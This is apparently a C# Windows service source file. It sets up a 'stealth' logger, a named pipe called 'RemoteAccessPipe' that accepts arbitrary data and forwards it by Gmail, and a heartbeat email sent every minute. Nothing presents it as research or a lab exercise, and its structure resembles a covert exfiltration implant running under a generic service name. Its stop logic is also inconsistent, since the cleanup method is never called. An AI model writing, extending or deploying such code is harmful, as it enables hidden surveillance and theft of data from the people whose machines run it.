using System;
using System.IO;
using System.IO.Pipes;
using System.ServiceProcess;
using System.Threading;

using WinSvc.Configuration;
using WinSvc.Core;
using WinSvc.Services;

namespace WinSvc;

public partial class Service1 : ServiceBase
{
    private Thread _pipeThread;
    private volatile bool _running;
    private Timer _heartbeat;
    private StateManager _state;
    private StealthLogger _logger;
    private GmailReportService _gmail;

    public Service1()
    {
        InitializeComponent();
    }

    protected override void OnStart(string[] args) => StartService();
    protected override void OnStop() => Stop();
    public void DebugStart(string[] args) => StartService();
    public void DebugStop() => Stop();

    private void StartService()
    {
        try
        {
            _state = new StateManager();
            _logger = new StealthLogger(_state);
            var config = new GmailConfig();
            _gmail = new GmailReportService(config, _logger, _state);

            if (!_gmail.Initialize())
            {
                _logger.Error("Gmail init failed, will retry");
            }

            _running = true;
            _pipeThread = new Thread(PipeListener) { IsBackground = true };
            _pipeThread.Start();

            _heartbeat = new Timer(_ => SafeHeartbeat(), null, 60000, 60000);
            _logger.Info("Service started");
        }
        catch (Exception ex)
        {
            _logger.Error("Start failed", ex);
            throw;
        }
    }

    private void StopService()
    {
        _running = false;
        _heartbeat?.Dispose();
        _pipeThread?.Join(5000);
        _gmail?.Dispose();
        _logger.Info("Service stopped");
    }

    private void PipeListener()
    {
        while (_running)
        {
            try
            {
                using (var pipe = new NamedPipeServerStream("RemoteAccessPipe", PipeDirection.InOut, 1))
                {
                    pipe.WaitForConnection();
                    using (var reader = new StreamReader(pipe))
                    using (var writer = new StreamWriter(pipe) { AutoFlush = true })
                    {
                        var req = reader.ReadLine();
                        if (req == "GET_EXTENDED_INFO")
                        {
                            writer.WriteLine("OK");
                            var data = reader.ReadToEnd();
                            if (!string.IsNullOrWhiteSpace(data))
                            {
                                _gmail.SendExtendedReport(data);
                                writer.WriteLine("SENT");
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                _logger.Error("Pipe error", ex);
                Thread.Sleep(1000);
            }
        }
    }

    private void SafeHeartbeat()
    {
        try
        {
            _gmail.SendHeartbeat();
        }
        catch (Exception ex)
        {
            _logger.Error("Heartbeat failed", ex);
        }
    }
}
